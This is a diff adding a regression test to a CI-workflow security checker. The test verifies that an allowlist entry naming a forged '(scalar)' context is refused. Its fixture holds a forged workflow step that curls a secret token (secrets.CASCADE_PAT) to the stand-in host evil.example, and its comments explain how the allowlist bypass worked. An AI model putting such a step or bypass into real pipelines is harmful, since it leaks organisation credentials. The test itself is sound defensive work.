@@ -1454,6 +1454,64 @@ describe('G1 -- an exemption cannot follow its line into a different sink (#37)'
     );
   });
 
+  test('N-W2: an entry that COPIES the printed (scalar) context is refused at the guarantee', () => {
+    // THE BYPASS ROUND 6 SHIPPED, AND THE LAYER THE SENTENCE NAMES. The hint
+    // above tells a contributor that no entry can name a `(scalar)` context.
+    // Round 6 asserted that in four files and one runtime message and enforced
+    // it nowhere: `entryShapeProblems` had seven refusals and none looked at
+    // the link, so an attacker who did what the allowlist header instructs --
+    // "Copy all five fields out of the failure message" -- got an accepted
+    // entry and a SILENT guarantee, with an org-level PAT in a live `curl`
+    // command line. Found independently by Phase 1 (round 6 §1) and Phase 2
+    // (round 6 §4) of PR #38; both handed over this refusal.
+    //
+    // The payload is N-W1's, unchanged, so the two cases differ only in what
+    // the attacker writes in the entry: N-W1 copies the LEGITIMATE context and
+    // is caught because the entry then matches nothing, and this one copies the
+    // FORGED context the red printed and is caught because no entry may name
+    // it. Post-round-6 the second is the strictly cheaper attack, and until
+    // this case nothing pinned it.
+    const forged = appendStep(ci, step(
+      '      - name: Forged context dedent new expr',
+      '        run: "curl -H \\"X: token',
+      '        with:',
+      '          registry-url: ${{ secrets.CASCADE_PAT }}',
+      '        \\" https://evil.example/x"',
+    ));
+    const why = 'secrets.CASCADE_PAT reaches the `registry-url:` input of actions/setup-node so private packages '
+      + 'resolve. An action input, not program text: the action receives it as a value and this workflow '
+      + 'builds no shell string from it.';
+    const copied = {
+      line: 'registry-url: ${{ secrets.CASCADE_PAT }}',
+      // Copied verbatim out of the red, `(scalar)` marker and all.
+      context: 'jobs > test > steps > with (scalar)',
+      expression: '${{ secrets.CASCADE_PAT }}',
+      occurrences: 1,
+      why,
+    };
+    // The context is the ONLY thing wrong with it. Every other field is the one
+    // N-W1 already measured through the shape floor, so if this case ever
+    // starts passing for a different reason, the control below reds first.
+    const legitimate = { ...copied, context: 'jobs > test > steps > with' };
+    assert.deepEqual(entryShapeProblems('ci.yml', legitimate), [], 'the control entry is well-formed, so the '
+      + 'refusal below is about the (scalar) link and nothing else');
+
+    const shape = entryShapeProblems('ci.yml', copied);
+    assert.equal(shape.length, 1, `naming a (scalar) context must be refused; got ${JSON.stringify(shape)}`);
+    assert.ok(shape[0].includes('(scalar)'), 'and the refusal must name the link it refuses');
+    assert.match(shape[0], /no entry may name one/, 'stating the rule the hint prints to contributors');
+
+    // At the guarantee, not only at the floor: `rawSweepProblems` calls
+    // `entryShapeProblems` for every entry, which is what makes the sentence
+    // true where it is written. Before this refusal this line was 0 problems.
+    const withCopied = { ...EXPRESSION_ALLOWLIST, 'ci.yml': [...EXPRESSION_ALLOWLIST['ci.yml'], copied] };
+    const problems = sweep('ci.yml', forged, withCopied);
+    assert.ok(
+      problems.some((p) => p.includes('(scalar)') && p.includes('secrets.CASCADE_PAT')),
+      `the guarantee must refuse the entry by name; got:\n${problems.map((x) => `  - ${x}`).join('\n') || '  (none)'}`,
+    );
+  });
+
   test('the discriminator is monotone: it can poison a link, never clean one', () => {
     // WHY THE OTHER 292 PINS DID NOT NEED RE-AUDITING. Dirty state can only
     // ever turn a bare link into a `(scalar)` link. It has no branch that
